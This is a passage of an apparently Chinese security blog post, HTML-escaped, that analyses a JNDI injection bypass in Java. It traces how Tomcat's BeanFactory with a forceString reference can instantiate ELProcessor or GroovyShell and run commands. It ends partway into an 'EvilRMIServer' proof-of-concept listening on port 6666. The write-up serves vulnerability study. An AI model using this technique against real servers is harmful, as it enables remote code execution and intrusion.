&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// if reference has no factory, check for addresses
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// containing URLs
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">answer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">processURLAddrs&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">nameCtx&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">answer&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">answer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// try using any specified factories
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">answer&lt;/span> &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">createObjectFromFactories&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">nameCtx&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">answer&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">answer&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到在处理 &lt;code>Reference&lt;/code> 对象时，会先调用 &lt;code>ref.getFactoryClassName()&lt;/code> 获取对应工厂类的名称，也就是会先从本地的&lt;code>CLASSPATH&lt;/code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。之后会执行静态代码块、代码块、无参构造函数和&lt;code>getObjectInstance&lt;/code>方法。那么只需要在攻击者本地&lt;code>CLASSPATH&lt;/code>找到这个&lt;code>Reference Factory&lt;/code>类并且在这四个地方其中一块能执行&lt;code>payload&lt;/code>就可以了。但&lt;code>getObjectInstance&lt;/code>方法需要你的类实现&lt;code>javax.naming.spi.ObjectFactory&lt;/code>接口&lt;/p>
&lt;p>因此，我们实际上可以指定一个存在于目标 &lt;code>classpath&lt;/code> 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。&lt;/p>
&lt;p>整个利用过程的主要调用栈如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>InitialContext#lookup()
RegistryContext#lookup()
RegistryContext#decodeObject()
NamingManager#getObjectInstance()
objectfactory = NamingManager#getObjectFactoryFromReference()
Class#newInstance() //--&amp;gt;恶意代码被执行
或: objectfactory#getObjectInstance() //--&amp;gt;恶意代码被执行
&lt;/code>&lt;/pre>&lt;p>满足要求的工厂类条件：&lt;/p>
&lt;ul>
&lt;li>存在于目标本地的 &lt;code>CLASSPATH&lt;/code> 中&lt;/li>
&lt;li>实现 &lt;code>javax.naming.spi.ObjectFactory&lt;/code> 接口&lt;/li>
&lt;li>至少存在一个 &lt;code>getObjectInstance()&lt;/code> 方法&lt;/li>
&lt;/ul>
&lt;p>存在于 &lt;code>Tomcat&lt;/code> 依赖包中的 &lt;code>org.apache.naming.factory.BeanFactory&lt;/code> 就是个不错的选择
&lt;code>org.apache.naming.factory.BeanFactory&lt;/code> ，这个类在 &lt;code>Tomcat&lt;/code> 中，很多 &lt;code>web&lt;/code> 应用都会包含，它的关键代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getObjectInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Name&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">nameCtx&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hashtable&lt;/span>&lt;span style="color:#f92672">&amp;lt;?,?&amp;gt;&lt;/span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">NamingException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">ref&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">beanClassName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassLoader&lt;/span> &lt;span style="color:#111">tcl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">currentThread&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getContextClassLoader&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 1. 反射获取类对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tcl&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">beanClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tcl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">loadClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">beanClassName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">beanClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">beanClassName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 2. 初始化类实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">bean&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">beanClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 3. 根据 Reference 的属性查找 setter 方法的别名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">RefAddr&lt;/span> &lt;span style="color:#111">ra&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;forceString&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ra&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getContent&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 4. 循环解析别名并保存到字典中
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">split&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">param&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;=&amp;#39;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setterName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">param&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">trim&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setterName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;set&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">toUpperCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Locale&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ENGLISH&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">forced&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">beanClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">setterName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">paramTypes&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 5. 解析所有属性，并根据别名去调用 setter 方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Enumeration&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">RefAddr&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAll&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hasMoreElements&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ra&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextElement&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">propName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ra&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getType&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ra&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getContent&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">valueArray&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">forced&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">propName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">valueArray&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bean&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">valueArray&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面注释标注了关键的部分，我们可以通过在返回给客户端的 &lt;code>Reference&lt;/code> 对象的 &lt;code>forceString&lt;/code> 字段指定 &lt;code>setter&lt;/code> 方法的别名，并在后续初始化过程中进行调用。&lt;code>forceString&lt;/code> 的格式为 &lt;code>a=foo,bar&lt;/code>，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 &lt;code>setter&lt;/code> 方法为等号后的值 &lt;code>foo&lt;/code>，如果不包含等号，则 &lt;code>setter&lt;/code> 方法为默认值 &lt;code>setBar&lt;/code>&lt;/p>
&lt;p>在后续调用时，调用 &lt;code>setter&lt;/code> 方法使用单个参数，且参数值为对应属性对象 &lt;code>RefAddr&lt;/code> 的值 (&lt;code>getContent&lt;/code>)。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数（RCE的调用函数的点）&lt;/p>
&lt;p>因为使用 &lt;code>newInstance&lt;/code>创建实例（也就是后面&lt;code>Poc&lt;/code>中的&lt;code>ELProcessor&lt;/code>），所以只能调用无参构造，这就要求目标 &lt;code>class&lt;/code> 得有无参构造方法，上面 &lt;code>forceString&lt;/code> 可以给属性强制指定一个 &lt;code>setter&lt;/code> 方法，参数为一个 &lt;code>String&lt;/code> 类型&lt;/p>
&lt;p>于是找到 &lt;code>javax.el.ELProcessor&lt;/code> 作为目标 &lt;code>class&lt;/code>，利用 &lt;code>el&lt;/code> 表达式执行命令，工具 &lt;a href="https://github.com/welk1n/JNDI-Injection-Bypass">JNDI-Injection-Bypass&lt;/a> 中的 &lt;code>EvilRMIServer.java&lt;/code> 部分代码如下&lt;/p>
&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/5b518569-640f-4972-bb40-3e6395f31974.png" alt="zongjie3.png">&lt;/p>
&lt;p>所以整个绕过流程就是：
为了绕过&lt;code>ConfigurationException&lt;/code>，需要满足&lt;code>ref.getFactoryClassLocation()&lt;/code> 为空，只需要在远程 &lt;code>RMI&lt;/code> 服务器返回的 &lt;code>Reference&lt;/code> 对象中不指定 &lt;code>Factory&lt;/code> 的 &lt;code>codebase&lt;/code>&lt;/p>
&lt;p>来到&lt;code>NamingManager&lt;/code>，需要在攻击者本地&lt;code>CLASSPATH&lt;/code>找到这个&lt;code>Reference Factory&lt;/code>类并且在其中一块代码能执行&lt;code>payload&lt;/code>，找到了&lt;code>BeanFactory&lt;/code>作为工厂类，&lt;code>BeanFactor&lt;/code>使用&lt;code>newInstance&lt;/code>创建实例，所以只能调用无参构造，这就要求目标 &lt;code>class&lt;/code> 得有无参构造方法且有办法执行相关命令，于是找到&lt;code>ELProcessor&lt;/code>和&lt;code>GroovyShell&lt;/code>&lt;/p>
&lt;p>**总结：**绕过了&lt;code>ConfigurationException&lt;/code>，进入&lt;code>NamingManager&lt;/code>，使用&lt;code>BeanFactor&lt;/code>创建&lt;code>ELProcessor&lt;/code>/&lt;code>GroovyShell&lt;/code>无参实例，然后&lt;code>BeanFactor&lt;/code>根据别名去调用方法（执行&lt;code>ELProcessor&lt;/code>中的&lt;code>eval&lt;/code>方法）&lt;/p>
&lt;p>&lt;strong>从JNDI_Injection_Bypass看另一种绕过方式：&lt;/strong>&lt;/p>
&lt;p>&lt;code>groovy.lang.GroovyShell&lt;/code>，原理也是类似的
&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/93428660-6110-414b-9e97-455163b504fb.png" alt="zongjie4.png">&lt;/p>
&lt;p>传入的 &lt;code>Reference&lt;/code>为 &lt;code>ResourceRef&lt;/code> 类，后面通过反射的方式实例化 &lt;code>Reference&lt;/code> 所指向的任意 &lt;code>Bean Class&lt;/code>，调用 &lt;code>setter&lt;/code> 方法为所有的属性赋值，该 &lt;code>Bean Class&lt;/code> 的类名、属性、属性值，全都来自于 &lt;code>Reference&lt;/code> 对象。&lt;code>ResourceRef&lt;/code>构造器的第七个参数&lt;code>factoryLocation&lt;/code>是远程加载&lt;code>factory&lt;/code>的地址，比如是一个&lt;code>url&lt;/code>,这里将其设置为&lt;code>null&lt;/code>,达到绕过&lt;code>ConfigurationException&lt;/code>限制&lt;/p>
&lt;h4 id="poc">poc&lt;/h4>
&lt;p>因为要使用 &lt;code>javax.el.ELProcessor&lt;/code>，所以需要 &lt;code>Tomcat 8+&lt;/code>或&lt;code>SpringBoot 1.2.x+&lt;/code>&lt;/p>
&lt;p>服务端：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.jndi.rmi.registry.ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.naming.ResourceRef&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.StringRefAddr&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.Registry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvilRMIServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[*]Evil RMI Server is Listening on port: 6666&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
